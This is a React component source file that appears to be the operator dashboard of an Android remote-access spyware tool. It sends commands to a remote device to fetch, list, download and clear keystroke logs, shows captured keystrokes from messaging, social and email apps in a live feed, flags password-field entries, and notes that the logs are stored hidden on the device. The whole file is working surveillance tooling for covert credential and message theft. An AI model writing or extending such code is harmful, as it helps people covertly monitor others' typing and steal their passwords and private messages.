import React, { useState, useEffect, useRef, useCallback, useMemo } from 'react';

const APP_COLORS = {
  'com.whatsapp': '#25D366',
  'com.instagram.android': '#E1306C',
  'com.facebook.katana': '#1877F2',
  'org.telegram.messenger': '#0088cc',
  'com.snapchat.android': '#FFFC00',
  'com.zhiliaoapp.musically': '#010101',
  'com.twitter.android': '#1DA1F2',
  'com.facebook.orca': '#0099FF',
  'com.google.android.gm': '#EA4335',
};

function getAppColor(pkg) {
  return APP_COLORS[pkg] || '#7c3aed';
}

function getAppShortName(pkg) {
  if (!pkg) return '?';
  const parts = pkg.split('.');
  return parts[parts.length - 1]?.slice(0, 2).toUpperCase() || '??';
}

function dedupeByTimestampAndText(entries) {
  const seen = new Set();
  return entries.filter(e => {
    const key = `${e.packageName}|${e.timestamp}|${e.text}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

export default function KeyloggerTab({ device, sendCommand, results, keylogPushEntries }) {
  const deviceId  = device.deviceId;
  const isOnline  = device.isOnline;

  const [storedLogs, setStoredLogs]   = useState([]);
  const [keylogFiles, setKeylogFiles] = useState([]);
  const [loading, setLoading]         = useState(false);
  const [filterPkg, setFilterPkg]     = useState('');
  const [autoScroll, setAutoScroll]   = useState(true);
  const [viewMode, setViewMode]       = useState('live');
  const logEndRef = useRef(null);
  const seenResultIds = useRef(new Set());

  const downloadBase64Text = (b64, filename) => {
    const raw = atob(b64);
    const blob = new Blob([raw], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  };

  useEffect(() => {
    const relevant = results.filter(r =>
      (r.command === 'get_keylogs' || r.command === 'list_keylog_files' || r.command === 'download_keylog_file') &&
      r.success && r.response
    );
    relevant.forEach(r => {
      if (seenResultIds.current.has(r.id)) return;
      seenResultIds.current.add(r.id);
      try {
        const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
        if (r.command === 'get_keylogs' && data.logs) {
          setStoredLogs(data.logs);
        }
        if (r.command === 'list_keylog_files' && data.files) {
          setKeylogFiles(data.files);
        }
        if (r.command === 'download_keylog_file' && data.base64) {
          downloadBase64Text(data.base64, `keylogs_${data.date}.txt`);
        }
      } catch (_) {}
    });
  }, [results]);

  const fetchLiveLogs = useCallback(() => {
    setLoading(true);
    sendCommand(deviceId, 'get_keylogs', { limit: 500 });
    setTimeout(() => setLoading(false), 1500);
  }, [deviceId, sendCommand]);

  const fetchFiles = useCallback(() => {
    sendCommand(deviceId, 'list_keylog_files', {});
  }, [deviceId, sendCommand]);

  useEffect(() => {
    if (isOnline) {
      fetchLiveLogs();
      fetchFiles();
    }
  }, [isOnline]);

  const combinedLogs = useMemo(() => dedupeByTimestampAndText([
    ...(keylogPushEntries || []),
    ...storedLogs,
  ]), [keylogPushEntries, storedLogs]);

  const filtered = useMemo(() => filterPkg
    ? combinedLogs.filter(l => (l.packageName || '').includes(filterPkg))
    : combinedLogs,
  [combinedLogs, filterPkg]);

  const pkgList = useMemo(() =>
    [...new Set(combinedLogs.map(l => l.packageName).filter(Boolean))],
  [combinedLogs]);

  useEffect(() => {
    if (autoScroll && logEndRef.current) {
      logEndRef.current.scrollIntoView({ behavior: 'auto' });
    }
  }, [combinedLogs.length, autoScroll]);

  const downloadDay = (date) => {
    sendCommand(deviceId, 'download_keylog_file', { date });
  };

  return (
    <div className="keylogger-tab">
      <div className="kl-toolbar">
        <div className="kl-view-tabs">
          <button className={`kl-vtab ${viewMode === 'live' ? 'active' : ''}`} onClick={() => setViewMode('live')}>
            ⌨️ Live Feed
          </button>
          <button className={`kl-vtab ${viewMode === 'files' ? 'active' : ''}`} onClick={() => { setViewMode('files'); fetchFiles(); }}>
            📁 Files
          </button>
        </div>
        <div className="kl-actions">
          {viewMode === 'live' && (
            <>
              <select
                value={filterPkg}
                onChange={e => setFilterPkg(e.target.value)}
                className="kl-filter-select"
              >
                <option value="">All Apps</option>
                {pkgList.map(p => <option key={p} value={p}>{p.split('.').pop()}</option>)}
              </select>
              <label className="kl-autoscroll">
                <input type="checkbox" checked={autoScroll} onChange={e => setAutoScroll(e.target.checked)} />
                Auto-scroll
              </label>
              <button className="kl-btn" onClick={fetchLiveLogs} disabled={!isOnline || loading}>
                {loading ? '…' : '↻ Refresh'}
              </button>
              <button className="kl-btn kl-btn-danger" onClick={() => {
                sendCommand(deviceId, 'clear_keylogs', {});
                setStoredLogs([]);
              }} disabled={!isOnline}>
                🧹 Clear
              </button>
            </>
          )}
        </div>
      </div>

      {viewMode === 'live' && (
        <div className="kl-feed-wrapper">
          <div className="kl-stats">
            <span>{filtered.length} entries</span>
            {keylogPushEntries?.length > 0 && (
              <span style={{ color: '#22d3ee', fontSize: 11, marginLeft: 8 }}>
                ● {keylogPushEntries.length} live
              </span>
            )}
            {filterPkg && <span style={{ color: '#7c3aed' }}>· Filtered: {filterPkg}</span>}
            <span style={{ marginLeft: 'auto', color: '#94a3b8', fontSize: 11 }}>
              Stored per-day in hidden internal storage • Downloads by file
            </span>
          </div>
          <div className="kl-feed">
            {filtered.length === 0 && (
              <div className="kl-empty">
                <div style={{ fontSize: 40 }}>⌨️</div>
                <div>No keylog entries</div>
                <div style={{ fontSize: 12, color: '#64748b' }}>
                  {isOnline ? 'Waiting for keystrokes…' : 'Device is offline'}
                </div>
              </div>
            )}
            {filtered.map((entry, i) => (
              <div key={`${entry.timestamp}-${entry.packageName}-${i}`} className="kl-entry">
                <div
                  className="kl-app-badge"
                  style={{ background: getAppColor(entry.packageName) + '22', borderColor: getAppColor(entry.packageName) + '66', color: getAppColor(entry.packageName) }}
                >
                  {getAppShortName(entry.packageName)}
                </div>
                <div className="kl-entry-body">
                  <span className="kl-app-name">{(entry.appName || entry.packageName || '').split('.').pop()}</span>
                  {(entry.isPassword === true || entry.isPassword === 'true' || entry.eventType === 'PASSWORD_FOCUS') && (
                    <span title={entry.fieldType || 'password field'} style={{ fontSize: 11, background: '#ef444422', color: '#ef4444', border: '1px solid #ef444466', borderRadius: 4, padding: '1px 5px', marginRight: 4, fontWeight: 700, letterSpacing: 0.5 }}>🔑 PWD</span>
                  )}
                  <span className="kl-text">{entry.text}</span>
                </div>
                <div className="kl-ts">{entry.timestamp?.slice(11, 19) || ''}</div>
              </div>
            ))}
            <div ref={logEndRef} />
          </div>
        </div>
      )}

      {viewMode === 'files' && (
        <div className="kl-files-view">
          <div className="kl-files-header">
            <span>📁 Keylog Files ({keylogFiles.length} days)</span>
            <button className="kl-btn" onClick={fetchFiles} disabled={!isOnline}>↻</button>
          </div>
          {keylogFiles.length === 0 ? (
            <div className="kl-empty">
              <div style={{ fontSize: 32 }}>📁</div>
              <div>No keylog files yet</div>
            </div>
          ) : (
            <div className="kl-file-list">
              {keylogFiles.map(f => (
                <div key={f.date || f.name} className="kl-file-item">
                  <div className="kl-file-icon">📄</div>
                  <div className="kl-file-info">
                    <div className="kl-file-date">{f.date || f.name}</div>
                    <div className="kl-file-size">{f.size ? (f.size / 1024).toFixed(1) + ' KB' : '—'}</div>
                  </div>
                  <div className="kl-file-actions">
                    <button
                      className="kl-btn kl-btn-dl"
                      onClick={() => downloadDay(f.date || f.name)}
                      disabled={!isOnline}
                      title="Download as text file"
                    >
                      ⬇ Download
                    </button>
                    <button
                      className="kl-btn"
                      onClick={() => { sendCommand(deviceId, 'get_keylogs', { limit: 500 }); setViewMode('live'); }}
                      disabled={!isOnline}
                    >
                      👁 View
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
